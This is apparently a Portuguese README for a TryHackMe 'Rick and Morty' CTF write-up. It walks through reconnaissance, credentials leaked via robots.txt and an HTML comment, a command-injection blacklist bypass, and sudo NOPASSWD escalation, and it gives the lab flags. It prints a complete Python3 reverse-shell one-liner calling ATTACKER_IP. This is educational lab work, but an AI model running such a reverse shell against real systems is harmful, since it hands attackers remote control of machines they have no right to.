<div align="center">
🧪 Rick and Morty CTF — Análise do TryHackMe

Teste de Penetração em Aplicações Web — Injeção de Comandos para Acesso Root

Mostrar imagem
Mostrar imagem
Mostrar imagem
Mostrar imagem

</div>

📖 Visão geral

Este repositório contém a descrição completa e o relatório profissional do teste de penetração para a sala Rick and Morty no TryHackMe , um desafio CTF com tema de Rick and Morty.

O cenário: Rick se meteu numa enrascada de novo — e dessa vez não tem volta. O objetivo é explorar um servidor web vulnerável e encontrar três ingredientes secretos necessários para preparar a poção de reversão, começando com um reconhecimento sem autenticação e chegando à invasão completa do sistema.


⚠️ Aviso: Esta avaliação foi realizada exclusivamente em uma máquina de laboratório isolada, fornecida pela TryHackMe para fins educacionais. Nenhum sistema, rede ou terceiro real foi alvo dos testes. Todas as técnicas descritas aqui devem ser aplicadas somente em ambientes autorizados.




🎯 Objetivos


Enumere os serviços e a superfície de ataque do host alvo.
Identificar e explorar vulnerabilidades em aplicações web.
Obter uma posição inicial (estrutura de baixo privilégio)
Aumentar os privilégios pararoot
Recupere todas as três bandeiras de desafio (ingredientes).



🛠️ Ferramentas e Técnicas

CategoriaFerramentas/TécnicasReconhecimentonmap(SYN scan, detecção de serviço/versão, vulnscripts NSE)Enumeração da WebFerramentas de desenvolvedor do navegador view-source, robots.txtanáliseExploraçãoInjeção de comando, bypass do filtro de lista negraPós-exploraçãoShell reverso ( netcat+ payload Python3), escalonamento de privilégios sudo


🗺️ Resumo da Cadeia de Ataque

Nmap Scan  →  robots.txt & HTML source disclosure  →  Login (Command Panel)
    │
    ▼
Command Injection (blacklist bypass)  →  1st & 2nd ingredients
    │
    ▼
Reverse Shell (www-data)  →  sudo NOPASSWD  →  root  →  3rd ingredient

1. Reconhecimento

Uma varredura completa de portas TCP nmaprevelou duas portas abertas:

PortaServiçoVersão22/tcpSSHOpenSSH 8.2p1 (Ubuntu)80/tcpHTTPApache 2.4.41 (Ubuntu)

Uma nmap --script vulnverificação também sinalizou um possível diretório de administração ( /login.php) e um robots.txtarquivo.

2. Enumeração Web


/robots.txtA sequência de caracteres revelou Wubbalubbadubdubuma forte indicação de uma senha.
O código-fonte HTML da página de destino continha um comentário do desenvolvedor que revelava o nome de usuário RickRules.
A combinação de ambas as formas de autenticação foi permitida em um Painel de Comando interno — um recurso que executa comandos brutos do sistema.


3. Exploração — Injeção de Comandos

O Painel de Comandos executa a entrada do usuário diretamente no sistema operacional com apenas uma lista negra de palavras-chave fraca (por exemplo, bloqueando `ls` )cat . Essa lista negra foi trivialmente contornada usando comandos equivalentes, como `ls` less, permitindo a enumeração completa do sistema de arquivos e a leitura de arquivos — fornecendo os dois primeiros ingredientes.

4. Pós-exploração — Escalada de privilégios

Um shell reverso em Python 3 foi injetado através do Painel de Comandos para obter um shell interativo completo da seguinte forma www-data:

bashpython3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("ATTACKER_IP",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/bash","-i"])'

A enumeração dos privilégios do sudo revelou uma NOPASSWDentrada insegura no sudoers, permitindo a execução irrestrita de comandos como root— a partir da qual o terceiro e último ingrediente foi obtido.


🏴 Bandeiras Capturadas (Ingredientes)

#IngredienteMétodo1mr. meeseek hairLeitura direta de arquivos via navegador (contornando listas negras)21 jerry tearlesscomando no Painel de Comandos3fleeb juicesudoNOPASSWD após shell reverso


🔎 Principais conclusões

#VulnerabilidadeGravidade1Divulgação de informações viarobots.txt🟢 Baixo2Divulgação de credenciais em comentário HTML🟡 Médio3Ignorar filtro de lista negra de comandos🟠 Alto4Injeção de Comando (RCE)🔴 Crítico5sudoersConfiguração insegura (NOPASSWD)🔴 Crítico

Recomendações: remover recursos de execução de comandos arbitrários, usar listas de permissão de entrada rigorosas em vez de listas de bloqueio, restringir sudoersas entradas seguindo o princípio do menor privilégio e evitar armazenar credenciais/dicas em arquivos públicos ou comentários de código-fonte.


📄 Relatório completo

O relatório completo e formatado do teste de penetração (PDF/DOCX), com todas as evidências e capturas de tela, está disponível aqui:


Pentest_Report_Rick_and_Morty_CTF_EN.pdf



👥 Autores

NomeGitHubLeonardo Pereira Pinheiro@LeobatmanRichard Silva e Araújo—


<div align="center">
Feito com 🧪 para fins de aprendizado — Sala de Rick e Morty do TryHackMe

</div>
